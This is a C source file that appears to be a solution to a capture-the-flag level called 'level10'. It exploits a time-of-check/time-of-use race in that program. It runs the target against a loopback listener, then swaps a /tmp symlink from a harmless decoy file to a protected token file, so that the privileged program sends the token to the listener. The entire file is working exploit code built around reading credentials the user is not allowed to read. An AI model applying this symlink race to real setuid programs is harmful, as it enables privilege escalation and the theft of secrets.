#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <semaphore.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>

// Example usage : ERR ( listen(sock, 10), err != 0, return 1 )
#define ERR(call, condition, on_failure) \
    { int64_t err = call; if (condition) { dprintf(STDERR_FILENO, "Error: %s:%d: %s: %s\n", __FILE__, __LINE__, #call, strerror(errno)); on_failure; } }

// Example Usage : int ERR ( fd, open(), err < 0, return 1 )
#define ERR_ASSIGN(var, call, condition, on_failure) \
    var = call; { int64_t err = var; if (condition) { dprintf(STDERR_FILENO, "Error: %s:%d: %s: %s\n", __FILE__, __LINE__, #call, strerror(errno)); on_failure; } }

// Example Usage : ERR_PTR ( strstr("hello world", "world"), err == null, return 1 )
#define ERR_PTR(call, condition, on_failure) \
    { void *err = call; if (condition) { dprintf(STDERR_FILENO, "Error: %s:%d: %s: %s\n", __FILE__, __LINE__, #call, strerror(errno)); on_failure; } }

// Example Usage : char * ERR_ASSIGN_PTR ( result, strdup("string"), err == null, return 1 )
#define ERR_ASSIGN_PTR(var, call, condition, on_failure) \
    var = call; { void *err = (void*)var; if (condition) { dprintf(STDERR_FILENO, "Error: %s:%d: %s: %s\n", __FILE__, __LINE__, #call, strerror(errno)); on_failure; } }


int main(int ac, char **av, char **envp)
{
    (void)ac;
    (void)av;

    // remove any previous content
    remove("/tmp/swap");
    sem_unlink("start_program_semaphore");

    int     pid = 0;
    int     sock = 0;
    int     client_sock = 0;
    sem_t*  semaphore = NULL;
    int     exit_value = 1;

    ERR_ASSIGN_PTR ( semaphore, sem_open("start_program_semaphore", O_CREAT | O_EXCL, S_IRWXU, 0), err == SEM_FAILED, goto error);

    dprintf (STDOUT_FILENO, "create fake file\n");
    ERR ( creat("/tmp/fake", 0777), err < 0, goto error );

    dprintf (STDOUT_FILENO, "create symlink\n");
    ERR( symlink("/tmp/fake", "/tmp/swap"), err != 0, goto error );

    dprintf (STDOUT_FILENO, "forking process\n");
    ERR_ASSIGN( pid, fork(), err == -1, goto error );

    if (pid == 0)
    {
        dprintf (STDOUT_FILENO, "waiting for semaphore in child\n");
        ERR( sem_wait(semaphore), err != 0, goto error );
        dprintf (STDOUT_FILENO, "starting executable\n");
        ERR( execve("level10", (char*[4]){"level10", "/tmp/swap", "127.0.0.1", NULL}, envp), 1, exit(1));
    }
    ERR_ASSIGN( sock, socket(AF_INET, SOCK_STREAM, 0), err < 0, goto error );

    ERR ( setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)), err < 0, goto error );

    struct sockaddr_in addr_in;
    addr_in.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr_in.sin_family = AF_INET;
    addr_in.sin_port = htons(6969);

    ERR( bind(sock, (struct sockaddr*)&addr_in, sizeof(addr_in)), err != 0, goto error );

    dprintf (STDOUT_FILENO, "starting server\n");
    ERR( listen(sock, 10), err != 0, goto error );

    ERR ( sem_post(semaphore), err != 0, goto error );

    dprintf (STDOUT_FILENO, "waiting response from executable\n");
    fd_set set;
    FD_ZERO(&set);
    FD_SET(sock, &set);
    ERR( select(sock + 1, &set, 0, 0, 0), err <= 0, goto error );
    dprintf (STDOUT_FILENO, "client tries connecting\n");

    // removing for symlink to succeed
    dprintf (STDOUT_FILENO, "removing symlink\n");
    ERR( remove("/tmp/swap"), err != 0, goto error );

    struct sockaddr_in client_addr;
    socklen_t          client_addr_len = sizeof(client_addr);
    ERR_ASSIGN( client_sock, accept(sock, (struct sockaddr*)&client_addr, &client_addr_len), err < 0, goto error );
    if (client_sock < 0)
    {
        dprintf(STDOUT_FILENO, "accept failed: %s\n", strerror(errno));
        return (1);
    }

    dprintf (STDOUT_FILENO, "swapping symlink\n");
    ERR( symlink("/home/user/level10/token", "/tmp/swap"), err != 0, goto error );

    int i = 2;
    while (i--)
    {
        char token_buffer[512];
        ssize_t ERR_ASSIGN( sz, recv(client_sock, token_buffer, 512, 0), err < 0, goto error);
        dprintf(STDOUT_FILENO, "received message:\n%.*s\n", (int)sz, token_buffer);
    }

    exit_value = 0;

error:
    ERR ( remove("/tmp/fake"), err != 0, );
    ERR ( remove("/tmp/swap"), err != 0, );

    ERR ( sem_close(semaphore), err != 0, );
    ERR ( sem_unlink("start_program_semaphore"), err != 0, );

    ERR ( close (client_sock), err != 0, );
    ERR ( close (sock), err != 0, );

    ERR ( kill(0, 9), err != 0, );

    return (exit_value);
}
